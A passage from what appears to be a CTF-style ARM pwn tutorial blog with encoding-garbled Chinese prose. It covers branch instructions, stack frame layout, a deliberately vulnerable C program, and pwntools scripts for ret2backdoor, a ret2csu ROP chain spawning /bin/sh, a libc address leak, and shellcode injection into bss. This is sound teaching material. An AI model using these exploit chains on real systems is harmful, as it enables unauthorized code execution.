<p>æ»¡åˆ™ä»£è¡¨æ ˆæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç©ºåˆ™ä»£è¡¨æ ˆæŒ‡é’ˆä¸æŒ‡å‘æ ˆé¡¶</p>

        <h3 id="3-è·³è½¬æŒ‡ä»¤"   >
          <a href="#3-è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·³è½¬æŒ‡ä»¤" class="headerlink" title="(3)è·³è½¬æŒ‡ä»¤"></a>(3)è·³è½¬æŒ‡ä»¤</h3>
      
        <h4 id="â‘ åˆ†æ”¯è·³è½¬-Branch"   >
          <a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="headerlink" title="â‘ åˆ†æ”¯è·³è½¬(Branch)"></a>â‘ åˆ†æ”¯è·³è½¬(Branch)</h4>
      
        <h5 id="B"   >
          <a href="#B" class="heading-link"><i class="fas fa-link"></i></a><a href="#B" class="headerlink" title="B"></a>B</h5>
      <p>æ— æ¡ä»¶è·³è½¬</p>

        <h5 id="BX-lt-Rm-gt"   >
          <a href="#BX-lt-Rm-gt" class="heading-link"><i class="fas fa-link"></i></a><a href="#BX-lt-Rm-gt" class="headerlink" title="BX &lt;Rm&gt;"></a>BX &lt;Rm&gt;</h5>
      <p>ç”±å¯„å­˜å™¨ç»™å‡ºåœ°å€</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º1ï¼Œåˆ‡æ¢åˆ° Thumb æŒ‡ä»¤æ‰§è¡Œï¼›</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º0ï¼Œåˆ‡æ¢åˆ° ARM æŒ‡ä»¤æ‰§è¡Œã€‚</p>

        <h5 id="BL"   >
          <a href="#BL" class="heading-link"><i class="fas fa-link"></i></a><a href="#BL" class="headerlink" title="BL"></a>BL</h5>
      <p>ç±»ä¼¼äºCallï¼Œä¼šå­˜å…¥è¿”å›åœ°å€åˆ°LRå¯„å­˜å™¨</p>

        <h5 id="BLX-BLR"   >
          <a href="#BLX-BLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#BLX-BLR" class="headerlink" title="BLX/BLR"></a>BLX/BLR</h5>
      <p>å³ç±»ä¼¼å¯¹åº”ç»„åˆ</p>

        <h4 id="â‘¡æ¡ä»¶è·³è½¬"   >
          <a href="#â‘¡æ¡ä»¶è·³è½¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ¡ä»¶è·³è½¬" class="headerlink" title="â‘¡æ¡ä»¶è·³è½¬"></a>â‘¡æ¡ä»¶è·³è½¬</h4>
      <p>ä¾æ®CPSRå¯„å­˜å™¨ä¸‹çš„ALUçŠ¶æ€æ ‡å¿—ä½</p>
<p>CPSRå¯„å­˜å™¨åŒ…å«ä¸‹é¢çš„ALUçŠ¶æ€æ ‡å¿—ï¼š</p>
<p>ã€€ã€€Nã€€ Set when the result of the operation was Negative(ç»“æœä¸ºè´Ÿæ•°)</p>
<p>ã€€ã€€Z    Set when the result of the operation was Zero(ç»“æœä¸º0)</p>
<p>ã€€ã€€C    Set when the operation result in a Carry(å‘ç”Ÿè¿›ä½ï¼Œæˆ–å€Ÿä½)</p>
<p>ã€€ã€€V    Set when the operation caused oVerflow(æ“ä½œé€ æˆæº¢å‡º)</p>
<p>ã€€ã€€Q    ARM architecture v5E only sticky flag</p>
<p>è¿˜æœ‰BEQã€BNE</p>

        <h2 id="2-éå¶å­å‡½æ•°æº¢å‡º"   >
          <a href="#2-éå¶å­å‡½æ•°æº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-éå¶å­å‡½æ•°æº¢å‡º" class="headerlink" title="2.éå¶å­å‡½æ•°æº¢å‡º"></a>2.éå¶å­å‡½æ•°æº¢å‡º</h2>
      
        <h3 id="1-æ ˆæ¨¡å‹"   >
          <a href="#1-æ ˆæ¨¡å‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å‹" class="headerlink" title="(1)æ ˆæ¨¡å‹"></a>(1)æ ˆæ¨¡å‹</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">| 	Last FP   | </span><br><span class="line">+-------------+</span><br><span class="line">| return_addr |&lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>å…ˆå‹å…¥LRï¼Œå†å‹å…¥FPï¼Œå½“å‰çš„FPæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸ºLRä¿å­˜çš„è¿”å›åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png" alt="image-20211103144720968"></p>

        <h3 id="2-é¢˜ç›®ï¼š"   >
          <a href="#2-é¢˜ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é¢˜ç›®ï¼š" class="headerlink" title="(2)é¢˜ç›®ï¼š"></a>(2)é¢˜ç›®ï¼š</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    myFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨ï¼š"   >
          <a href="#3-åˆ©ç”¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨ï¼š" class="headerlink" title="(3)åˆ©ç”¨ï¼š"></a>(3)åˆ©ç”¨ï¼š</h3>
      <p>ä¸€èˆ¬è€Œè¨€éƒ½æ˜¯ä¸å­˜åœ¨PIEçš„</p>

        <h4 id="A-åé—¨"   >
          <a href="#A-åé—¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-åé—¨" class="headerlink" title="A.åé—¨"></a>A.åé—¨</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">backDoor = <span class="number">0x1050C</span></span><br><span class="line"></span><br><span class="line">fake_FP = <span class="number">0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(backDoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h4 id="B-ROPé“¾æ¡"   >
          <a href="#B-ROPé“¾æ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-ROPé“¾æ¡" class="headerlink" title="B.ROPé“¾æ¡"></a>B.ROPé“¾æ¡</h4>
      
        <h5 id="ğŸ”ºæ³¨æ„ï¼š"   >
          <a href="#ğŸ”ºæ³¨æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨æ„ï¼š" class="headerlink" title="ğŸ”ºæ³¨æ„ï¼š"></a>ğŸ”ºæ³¨æ„ï¼š</h5>
      <p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œåœ¨æˆ‘çš„GDBè°ƒè¯•æ—¶ï¼Œæ‰“å°å‡ºæ¥çš„å‡½æ•°åœ°å€å’ŒçœŸå®çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png" alt="image-20211104115041178"></p>
<p>ä¸Šé¢0x2101cæ˜¯systemçš„gotè¡¨åœ°å€ï¼Œå¯æ˜¯å’ŒGDBæ‰“å°çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼Œä½†æ˜¯å®é™…ä¸Šlibc.soæ–‡ä»¶æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºå¯ä»¥æ­£å¸¸getshellã€‚ä¹‹åå’¨è¯¢äº†luckyå¸ˆå‚…ä¹‹åï¼Œåœ¨å®¤å‹çš„å¸®åŠ©ä¸‹ï¼Œç¼–è¯‘äº†å„ä¸ªç‰ˆæœ¬çš„armæ¶æ„ä¸‹çš„glibcï¼Œå†é€šè¿‡qemuåŠ è½½è¿è¡Œåº“å°±æ­£å¸¸äº†ã€‚</p>

        <h5 id="åŠ«æŒæ ˆæ¨¡å‹ï¼š"   >
          <a href="#åŠ«æŒæ ˆæ¨¡å‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŠ«æŒæ ˆæ¨¡å‹ï¼š" class="headerlink" title="åŠ«æŒæ ˆæ¨¡å‹ï¼š"></a>åŠ«æŒæ ˆæ¨¡å‹ï¼š</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | </span><br><span class="line">+-------------+</span><br><span class="line">|gadgets_addr | &lt;- frame pointer(return_addr)</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶"   >
          <a href="#A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶" class="headerlink" title="A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶"></a>A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶</h5>
      
        <h6 id="a-å­˜åœ¨pop-r0-pc"   >
          <a href="#a-å­˜åœ¨pop-r0-pc" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-å­˜åœ¨pop-r0-pc" class="headerlink" title="a.å­˜åœ¨pop {r0,*, pc}"></a>a.å­˜åœ¨<code>pop &#123;r0,*, pc&#125;</code></h6>
      <p>å½“æœ‰<code>pop &#123;r0,*, pc&#125;</code>è¿™ç§gadgetï¼Œå½“ç„¶å°±æ˜¯æƒ³æ€ä¹ˆç”¨å°±æ€ä¹ˆç”¨ï¼Œä½†æ²¡æœ‰çš„æ—¶å€™å¯ä»¥ç”¨å¸¸è§çš„CSUæ¥æ›¿ä»£ã€‚</p>

        <h6 id="b-åˆ©ç”¨csu"   >
          <a href="#b-åˆ©ç”¨csu" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-åˆ©ç”¨csu" class="headerlink" title="b.åˆ©ç”¨csu"></a>b.åˆ©ç”¨csu</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">.text:0001049C                 LDR     R3, [R5],#4                 â‘¡</span><br><span class="line">.text:000104A0                 MOV     R2, R9</span><br><span class="line">.text:000104A4                 MOV     R1, R8</span><br><span class="line">.text:000104A8                 MOV     R0, R7</span><br><span class="line">.text:000104AC                 BLX     R3                          â‘¢</span><br><span class="line">.text:000104B0                 CMP     R6, R4</span><br><span class="line">.text:000104B4                 BNE     loc_10498</span><br><span class="line">.text:000104B8                 LDMFD   SP!, &#123;R4-R10,PC&#125;            â‘ </span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±æ˜¯å¾ˆæ­£å¸¸çš„ï¼Œé€šè¿‡â‘ æ¥ä¸ºR4-R10èµ‹å€¼ï¼Œä»¥åŠæ§åˆ¶PCè·³è½¬åˆ°â‘¡ï¼Œå†åˆ©ç”¨R5åœ°å€å¯¹åº”çš„å€¼æ¥èµ‹å€¼ç»™R3å¯¹åº”è·³è½¬ï¼ŒæœŸé—´ä¹Ÿå¯é€šè¿‡R7-R8æ¥æ§åˆ¶R0-R2çš„å‚æ•°ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³R5å¤„ä¿å­˜çš„æ˜¯gotè¡¨åœ°å€ï¼Œå³å°†R5èµ‹å€¼ä¸ºfunc_got_addrå³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arm_csu</span>(<span class="params">call,u_gadget1,u_gadget2,r0,r1,r2</span>):</span></span><br><span class="line">    payload = p32(u_gadget1)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(call) <span class="comment">#[r5]-&gt;r3  blx r3</span></span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(r0)</span><br><span class="line">    payload += p32(r1)</span><br><span class="line">    payload += p32(r2)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(u_gadget2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">u_gadget1 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x54</span></span><br><span class="line">u_gadget2 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(system_got,u_gadget1,u_gadget2,binsh_addr,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>



<p>è¿™ä¸ªæ˜¯åŸºäºè°ƒç”¨äº†systemå‡½æ•°ï¼Œæ‰€ä»¥systemå‡½æ•°ä¸­çš„Gotè¡¨ä¸­å·²ç»æœ‰äº†å‡½æ•°åœ°å€ï¼ŒåŒæ ·çš„ï¼Œå½“æ²¡æœ‰æ—¶éœ€è¦æ³„éœ²åœ°å€ï¼Œé€šå¸¸è°ƒç”¨putså‡½æ•°æˆ–è€…printfå‡½æ•°å³å¯æ³„éœ²åœ°å€ï¼Œå¦‚ä¸‹ç›¸å…³è„šæœ¬</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = &quot;A&quot;*0x10</span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(printf_got,u_gadget1,u_gadget2,printf_got,0,0)</span><br><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">#mulArchDbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32Leakbase(0)</span><br><span class="line">libc.address = printf_addr - libc.sym[&#x27;printf&#x27;]</span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">lg(&quot;system_addr&quot;,system_addr)</span><br><span class="line">lg(&quot;binsh_addr&quot;,binsh_addr) </span><br></pre></td></tr></table></div></figure>

<p>æ§åˆ¶è¿”å›åœ°å€è¿›å…¥u_gadget1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png" alt="image-20211105110402858"></p>
<p>ç„¶åæ§åˆ¶R4~R10å¯„å­˜å™¨ï¼Œè·³è½¬u_gadget2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png" alt="image-20211105110734269"></p>
<p>ç„¶åè·³è½¬gotè¡¨ä¸­å‡½æ•°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png" alt="image-20211105110946942"></p>
<p>è¿™é‡Œåœ¨è°ƒç”¨CSUæ—¶ä¹Ÿéœ€è¦æ§åˆ¶R6å’ŒR4ï¼Œä¾æ®<code>CMP     R6, R4</code>ï¼Œä½¿å¾—ä¹‹åçš„<code>BNE     loc_10624</code>çŸ­è·³è½¬ä¸æˆç«‹ï¼Œè¿›å…¥åˆ°csuä¸­çš„æœ€åçš„<code>POP     &#123;R4-R10,PC&#125;</code>è¯­å¥ï¼Œè¿™æ—¶å€™å†å°†æ ˆæ§å¥½ï¼Œå°±èƒ½è¿”å›åˆ°startå‡½æ•°é‡æ–°å¼€å§‹äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png" alt="image-20211105112027065"></p>
<p>ç°åœ¨çš„æ ˆåœ¨æˆ‘ä»¬æœ€å¼€å§‹çš„æ—¶å€™å·²ç»é€šè¿‡ä»¥ä¸‹è¯­å¥æ§åˆ¶å¥½äº†ï¼Œpopä¹‹åå³å¯æ§åˆ¶pcè¿›å…¥startå‡½æ•°é‡æ–°å¼€å§‹ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></div></figure>

<p>æ³„éœ²åœ°å€ä¹‹åï¼Œå¦‚æœç¨‹åºä¸­æ²¡æœ‰è°ƒç”¨systemï¼Œé‚£ä¹ˆä¾ç„¶ä¹Ÿæ— æ³•é€šè¿‡ret2csuæ¥getshellï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¸‹åˆ—çš„æ¥ä»£æ›¿ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; 	#pop_R4_R10_PC</span><br><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br><span class="line">mov r0, r7 ; blx r3						#movR0_R7_BLR3</span><br></pre></td></tr></table></div></figure>

<p>è€Œ<code>pop_R4_R10_PC</code>å’Œ<code>movR0_R7_BLR3</code>éƒ½æ˜¯csuä¸­çš„ï¼Œ<code>pop_r3_pc</code>åˆ™éå¸¸å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½æœ‰ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯å…ˆæ§R7ï¼Œåœ¨æ§R3ï¼Œæœ€åR7èµ‹ç»™R0ï¼Œè·³è½¬R3è°ƒç”¨æƒ³è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œå°±æ˜¯<code>system(&#39;/bin/sh&#39;)</code>ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_R4_R10_PC)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r4</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r5</span></span><br><span class="line">payload += p32(<span class="number">0</span>) 				<span class="comment">#r6</span></span><br><span class="line">payload += p32(binsh_addr)      <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r8</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r9</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r10</span></span><br><span class="line">payload += p32(pop_r3_pc)      	<span class="comment">#r3</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(movR0_R7_BLR3)</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„systemå‡½æ•°åœ°å€å°±å¾—æ˜¯æ³„éœ²çš„çœŸå®åœ°å€äº†ï¼Œå› ä¸ºèµ‹å€¼è¿‡ç¨‹æ˜¯ç›´æ¥å¯„å­˜å™¨èµ‹å€¼ï¼Œè€Œä¸æ˜¯å–å¯„å­˜å™¨å€¼ä¸ºåœ°å€å†å–å€¼äº†ã€‚</p>
<p>è¿™é‡Œçš„fake_FPåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯ä¸‹é¢ä»‹ç»çš„å°±ä¼šæœ‰ç”¨äº†ã€‚</p>

        <h5 id="B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶"   >
          <a href="#B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶" class="headerlink" title="B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶"></a>B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶</h5>
      <p>å½“æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶ï¼Œæ¯”å¦‚åªèƒ½æº¢å‡º0x10ä¸ªå­—èŠ‚æ—¶ã€‚</p>
<p>å‚ç…§inctf2018-warmupé¢˜ç›®</p>

        <h6 id="a-åˆ©ç”¨readå‡½æ•°-shellcode"   >
          <a href="#a-åˆ©ç”¨readå‡½æ•°-shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-åˆ©ç”¨readå‡½æ•°-shellcode" class="headerlink" title="a.åˆ©ç”¨readå‡½æ•°+shellcode"></a>a.åˆ©ç”¨readå‡½æ•°+shellcode</h6>
      <p>å½“è°ƒç”¨äº†readå‡½æ•°æ—¶ï¼Œä¸”è¯¥armæ¶æ„ä½¿ç”¨qemuæ¨¡æ‹Ÿï¼Œé‚£ä¹ˆbssæ®µåŸºæœ¬éƒ½æ˜¯å¯æ‰§è¡Œçš„ã€‚(å…·ä½“åŸå› æœªçŸ¥)</p>
<p>é‚£ä¹ˆè°ƒç”¨readå‡½æ•°ä¸€èˆ¬éƒ½æ˜¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010540                 MOV     R2, #0x100      ; nbytes</span><br><span class="line">.text:00010544                 MOV     R1, R3          ; buf</span><br><span class="line">.text:00010548                 MOV     R0, #0          ; fd</span><br><span class="line">.text:0001054C                 BL      read</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±å¯ä»¥é€šè¿‡èµ‹å€¼ç»™bufçš„è¯­å¥æ¥åŠ«æŒR1ï¼Œå°†shellcodeè¯»å–åˆ°æˆ‘ä»¬æƒ³æ”¾ç½®çš„ä½ç½®ï¼Œå½“ç„¶ï¼Œè¿™ä¹‹å‰è¿˜æ˜¯å¾—åŠ«æŒR3å¯„å­˜å™¨ï¼Œä¸è¿‡è¿™ä¸ªç›´æ¥é€šè¿‡å¾ˆå¸¸ç”¨çš„gadgetå³å¯ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr = bss_addr + <span class="number">0x4</span></span><br><span class="line">fake_FP = bss_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_r3_pc)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(read_gadget)</span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png" alt="image-20211105115257258"></p>
<p>è¿™æ ·å³å¯è¯»å–shellcodeåˆ°bssæ®µäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png" alt="image-20211105115432342"></p>
